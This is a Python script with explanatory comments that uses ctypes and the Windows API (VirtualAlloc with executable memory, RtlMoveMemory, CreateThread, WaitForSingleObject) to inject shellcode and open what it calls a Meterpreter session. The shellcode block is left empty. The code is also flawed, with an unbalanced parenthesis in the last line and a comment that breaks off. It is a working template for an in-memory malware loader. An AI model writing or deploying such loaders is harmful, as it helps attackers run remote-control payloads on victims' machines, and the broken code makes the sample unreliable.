import ctypes
# ctypes makes it very simple to interact with the Windows API in a python script,so it will be a required import for this script. It provides C compatible data types and allows calling functions in DLLs or shared libraries
shellcode = (
);
# Shellcode - This is the shellcode that will be injected into memory and then execute it which will grant us a juide ssl certified meterpreter session
# We will be using 4 Win32 APIs, to execute the shellcode, these APIs are very important in dynamic memory management on Windows Platforms
ptr = ctypes.windll.kernel32.VirtualAlloc(0,4096,ctypes.c_int(0x1000),ctypes.c_int(0x40))
# First VirtualAlloc() function will allow us to create a new executable memory region and copy our shellcode to it and after that execute it
b = bytearray() # Store b as bytearray() so our shellcode in Python3 won't be used as bytes but bytecode
b.extend(map(ord, shellcode))
buf = (ctypes.c_char * len(shellcode)).from_buffer(b)
# Buffer pool constructs an array that consists the size of our shellcode
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                    buf,
                                    ctypes.c_int(len(shellcode)))
# RtlMoveMemory() function accepts 3 arguments, a pointer to the destination (returned from VirtualAlloc()), a pointer to the memory to be copied and the number of bytes to be copied,in our case the size of the shellcode
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                        ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                          ctypes.c_int(0),
                                           ctypes.c_int(0),
                                            ctypes.pointer(ctypes.c_int(0)))
# CreateThread() accepts 6 arguments in our case the third argument is very important, we need to pass a pointer to the application -defined function to be executed by the thread returned by VirtualAlloc() if the function succeds,the return value is a handle to the new thread.
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1)))
# WaitForSingleObject() function accepts 2 arguments, the first one is the handle to the object (returned by CreateThread()) and the time-o
